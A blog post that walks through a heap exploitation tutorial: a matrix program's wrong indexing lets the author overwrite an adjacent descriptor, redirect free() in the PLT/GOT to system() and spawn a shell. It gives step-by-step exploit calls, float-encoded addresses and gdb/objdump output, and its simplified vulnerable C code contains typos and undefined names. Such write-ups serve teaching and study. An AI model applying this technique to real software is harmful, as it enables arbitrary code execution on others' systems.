---
layout: post
title: A Tale of Indices
tags: exploit c-cpp
excerpt: Exploting bad indexing code to mess with malloc and the PLT
---

This is the story of how bad indexing code can lead to an exploit. Even though
this is on the heap, most of it doesn't actually involve malloc that much, but
relies on a specific feature of it: memory blocks are adjacent. However, it does
involve messing with the plt!

<!--more-->

## A Wild Bug Appears

First, the code. This is not exactly the original code, but simplified quite a
bit (removing the input logic, much checking and other functionality).

``` c
struct matrix
{
	int rows, cols;
	float* data; // allocated in the heap, has rows * cols floats
};

struct matrix* matrices[64]; // each matrix is allocated in the heap

float* get_addr(int id, int row, int col)
{
	// assume these values have been checked and are in range
	return &matrices[id]->data[row * mat->rows + col];
}

float get(int id, int row, int col)
{
	return *get_addr(id, row, col);
}

void set(int id, int row, int col, int val)
{
	*get_addr(id, row, call) = val;
}

int allocate(int rows, int cols)
{
	int id = get_free_id(); // logic somewhere else
	matrices[id] = malloc(sizeof(struct matrix));
	matrices[id]->rows = rows;
	matrices[id]->cols = cols;
	matrices[id]->data = calloc(sizeof(float) * rows * cols);
}

void release(int id)
{
	free(matrices[id]->data);
	free(matrices[id]);
	matrices[id] = 0;
}
```

Can you find the bug? Hint: it's in `get_addr`. The matrix indexing is
incorrect, it should be `row * mat->cols + col`. See the difference? This
overflow is what allows the shell to be spawned.

## A note on float conversion

In this program, memory is only accessible as floats. While inconvenient, this
is still usable as floats also take up the same space as ints, 4 bytes. With
enough digits, we can be guaranteed to get an identical value when we set it. To
find this value, we can use a union:

``` c
int main()
{
	union {
		int a;
		float b;
	};
	// set a or b here
	// e.g. a = 0x100
	printf("%8x %.9g", a, b);
}
```

Later on, we'll also write strings. Since the system is little endian (x86), we
just use the characters' ASCII value, in reverse order (for each 4-byte chunk).

## Exploit Preparation

Firstly, a bit on `malloc()`. It obtains memory from the system (usually via
`mmap()`), and divides it up into chunks. These are then allocated when
requested by the programmer. Since the block given is the first that fit the
size, this results in the matrices and their descriptors being allocated right
next to each other:

``` raw
+-------------+-------------------+-------------+-------------------+
| (sz) | mat1 | (sz) | mat1->data | (sz) | mat2 | (sz) | mat2->data |
+-------------+-------------------+-------------+-------------------+
```
As a result, we can exploit the bad indexing to overwrite the matrix descriptor
(in this case mat2) from the previous data block (mat1->data). Through this, we
can overwrite the data pointer of mat2 to whatever we want, allowing us to write
to any location in memory. One potential target is the plt (procedural link
table), which lists the location of functions of dynamically loaded libraries
(e.g. libc). However, one specific entry is of interest - `free()`. When
matrices are released, this is called on user-editable data, and with that as
the only argument. `system()` also takes a pointer as a single argument!

However, there is a problem: dynamic libraries can be loaded anywhere, and so
can `system()`. However, it is always at the same offset from `free()`, and we
can use that, along with the existing plt entry to calculate the position of
`system()`.

## Actual Exploit

First, we need to get some information:

``` raw
$ objdump -R matrix | grep free
0804a10c R_386_JUMP_SLOT   free
$ gdb -q matrix
Reading symbols from matrix...(no debugging symbols found)...done.
(gdb) p __libc_system - __libc_free
$1 = -228656
```

Now, we perform the actual exploit. First, we create 2 matrices which have more
rows than columns (e.g. 8*7). We then create and release another matrix. This is
required to initialize the plt entry to the actual location of `free()`
(`__libc_free()`), from which we can figure out the location of `system()` using
the offset. We now can use the overflowing get_addr logic to overwrite mat2's
data pointer to point to 0x0804a10c (the address of the plt entry).

``` c
allocate(8, 7); // id 0
allocate(8, 7); // id 1
allocate(1, 1); // id 2
release(2);
```

Now, how do we figure out where to write to overwrite that pointer? Since it's
the last element of the struct, we search down from the top, until we get to the
second non-zero value. Why second? Because the first would be the size of the
next block, and we have no need overwriting that. From my tests, it appears that
with an 8*7 matrix, the value is located at [7,4], which we overwrite with the
float equivalent of 0x0804a10c.

``` c
set(0, 7, 4, 3.991161479e-34); // mat[7][4] = 0x0804a10c
```

Then, we can get the current value of the plt entry, which would be the address
of `__libc_free()`. We can add the offset (-228656) to this to get the address
of `__libc_system()` and overwrite the exiting value with this.

``` c
get(1, 0, 0); // returns -4.468552546e+33 == 0xf75c5110
set(1, 0, 0, -4.397786941e+33); // mat[0][0] = 0xf758d3e0 == (0xf75c5110 - 228656)
```

Now that we have overwritten `free()`, we can write the payload, which is
"/bin/sh" (you can use any command here though). And we execute the command by
freeing that matrix.

``` c
set(0, 0, 0, 1.805717599e+28); // mat[0][0] = 0x6e69622f == '/bin'
set(0, 0, 1, 9.592211688e-39); // mat[0][0] = 0x0068732f == '/sh\0'
release(0);
$
```

Shell!
